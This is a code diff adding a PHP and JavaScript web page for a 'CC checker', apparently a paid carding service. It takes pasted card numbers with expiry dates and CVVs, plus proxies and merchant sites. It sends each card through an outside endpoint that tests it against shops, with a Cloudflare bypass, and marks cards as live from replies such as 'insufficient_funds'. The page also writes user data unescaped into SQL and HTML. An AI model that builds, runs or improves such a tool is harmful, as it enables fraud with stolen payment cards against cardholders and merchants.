@@ -1,0 +1,203 @@
+<?php
+include('config.php');
+session_start();
+if (!isset($_SESSION['user_id'])) {
+    header("Location: login.php");
+    exit();
+}
+
+$user_id = $_SESSION['user_id'];
+
+$sql = "SELECT username, credit, total_cc, usertype FROM users WHERE id = '$user_id' LIMIT 1";
+$result = mysqli_query($conn, $sql);
+
+if (mysqli_num_rows($result) > 0) {
+    $user = mysqli_fetch_assoc($result);
+    $username = $user['username'];
+    $credits = $user['credit'];
+    $total_cc = $user['total_cc'];
+    $usertype = $user['usertype'];
+} else {
+    session_destroy();
+    header("Location: login.php");
+    exit();
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CC Checker with Start/Stop</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background-color: #0f0f0f; color: #fff; }
+        .card { background: #1a1a1a; border: none; }
+        .btn-custom { border-radius: 25px; }
+        .stats { font-size: 18px; }
+        .result { white-space: pre-wrap; font-size: 14px; }
+    </style>
+</head>
+<body>
+<div class="container mt-4">
+    <div class="row">
+        <div class="col-md-8">
+            <h3>Welcome, <?php echo $username; ?></h3>
+
+            <div class="mb-3">
+                <label class="form-label">Enter CC List (one per line):</label>
+                <textarea id="cardlist" class="form-control" rows="5" placeholder="xxxx|xx|xxx|xxx"></textarea>
+            </div>
+
+            <div class="mb-3">
+                <label class="form-label">Add Sites:</label>
+                <textarea id="sites" class="form-control" rows="3" placeholder="site1.com\nsite2.com"></textarea>
+                <button class="btn btn-primary btn-sm mt-2" onclick="saveSites()">Save Sites</button>
+                <button class="btn btn-danger btn-sm mt-2" onclick="clearSites()">Clear</button>
+            </div>
+
+            <div class="mb-3">
+                <label class="form-label">Add Proxies:</label>
+                <textarea id="proxies" class="form-control" rows="3" placeholder="ip:port\nip:port"></textarea>
+                <button class="btn btn-primary btn-sm mt-2" onclick="saveProxies()">Save Proxies</button>
+                <button class="btn btn-danger btn-sm mt-2" onclick="clearProxies()">Clear</button>
+            </div>
+
+            <div class="mb-3 d-flex gap-2">
+                <button class="btn btn-success btn-custom" onclick="startChecker()">▶️ Start</button>
+                <button class="btn btn-warning btn-custom" onclick="stopChecker()">⏹️ Stop</button>
+            </div>
+
+            <div class="card p-3">
+                <h5>Result</h5>
+                <div id="result" class="result"></div>
+            </div>
+        </div>
+
+        <div class="col-md-4">
+            <div class="card p-3">
+                <h4>📊 Stats</h4>
+                <p>Total CC: <span id="total_cc">0</span></p>
+                <p>Total Approve ✅: <span id="total_approve">0</span></p>
+                <p>Total Decline ❌: <span id="total_decline">0</span></p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+var userCredits = <?php echo $credits; ?>;
+var approve_keywords = [
+    "invalid_cvv", "incorrect_cvv", "insufficient_funds",
+    "approved", "thank you", "success", "invalid_cvc",
+    "incorrect_cvc", "incorrect_zip"
+];
+var intervalId = null;
+var cards = [];
+
+document.addEventListener("DOMContentLoaded", () => {
+    document.getElementById("sites").value = localStorage.getItem("savedSites") || "";
+    document.getElementById("proxies").value = localStorage.getItem("savedProxies") || "";
+});
+
+function saveSites() {
+    localStorage.setItem("savedSites", document.getElementById("sites").value);
+}
+
+function clearSites() {
+    localStorage.removeItem("savedSites");
+    document.getElementById("sites").value = "";
+}
+
+function saveProxies() {
+    localStorage.setItem("savedProxies", document.getElementById("proxies").value);
+}
+
+function clearProxies() {
+    localStorage.removeItem("savedProxies");
+    document.getElementById("proxies").value = "";
+}
+
+function startChecker() {
+    if (intervalId) {
+        alert("Already running.");
+        return;
+    }
+
+    let sites = (localStorage.getItem("savedSites") || "").split("\n").filter(s => s.trim() !== "");
+    let proxies = (localStorage.getItem("savedProxies") || "").split("\n").filter(p => p.trim() !== "");
+    cards = document.getElementById("cardlist").value.trim().split("\n").filter(c => c.trim() !== "");
+
+    if (cards.length === 0) return alert("Please add CCs.");
+    if (sites.length === 0) return alert("Please add sites.");
+    if (proxies.length === 0) return alert("Please add proxies.");
+
+    intervalId = setInterval(() => {
+        if (cards.length === 0) {
+            stopChecker();
+            alert("✅ All cards processed.");
+            return;
+        }
+        let card = cards.shift();
+        document.getElementById("cardlist").value = cards.join("\n");
+        checkCard(card);
+    }, 1000);
+}
+
+function stopChecker() {
+    clearInterval(intervalId);
+    intervalId = null;
+}
+
+function checkCard(card) {
+    let sites = (localStorage.getItem("savedSites") || "").split("\n").filter(s => s.trim() !== "");
+    let proxies = (localStorage.getItem("savedProxies") || "").split("\n").filter(p => p.trim() !== "");
+
+    if (sites.length === 0 || proxies.length === 0) {
+        stopChecker();
+        alert("Sites or proxies empty!");
+        return;
+    }
+
+    let site = sites[Math.floor(Math.random() * sites.length)];
+    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
+
+    let url = `https://proxkamal.com/kamal/sho.php?cc=${encodeURIComponent(card)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;
+
+    fetch("proxy.php?url=" + encodeURIComponent(url))
+    .then(res => res.json())
+    .then(data => {
+        document.getElementById("total_cc").innerText = parseInt(document.getElementById("total_cc").innerText) + 1;
+
+        let responseText = JSON.stringify(data);
+        let price = data.Price || "N/A";
+        let gateway = data.Gateway || "N/A";
+        let cc = data.cc || "N/A";
+
+        let status = "❌ Decline";
+        for (let k of approve_keywords) {
+            if (responseText.toLowerCase().includes(k)) {
+                status = "✅ Approve";
+                document.getElementById("total_approve").innerText = parseInt(document.getElementById("total_approve").innerText) + 1;
+                break;
+            }
+        }
+        if (status === "❌ Decline") {
+            document.getElementById("total_decline").innerText = parseInt(document.getElementById("total_decline").innerText) + 1;
+        }
+
+        document.getElementById("result").innerText =
+            `CC: ${cc}\nPrice: ${price}\nGateway: ${gateway}\nResponse: ${data.Response}\nStatus: ${status}\n\n` + document.getElementById("result").innerText;
+
+        if (data.Response === "Cloudflare Bypass Failed , Receipt ID is empty") {
+            sites.splice(sites.indexOf(site), 1);
+            localStorage.setItem("savedSites", sites.join("\n"));
+        }
+    })
+    .catch(e => {
+        document.getElementById("result").innerText = "Error: " + e + "\n" + document.getElementById("result").innerText;
+    });
+}
+</script>
+
+</body>
+</html>
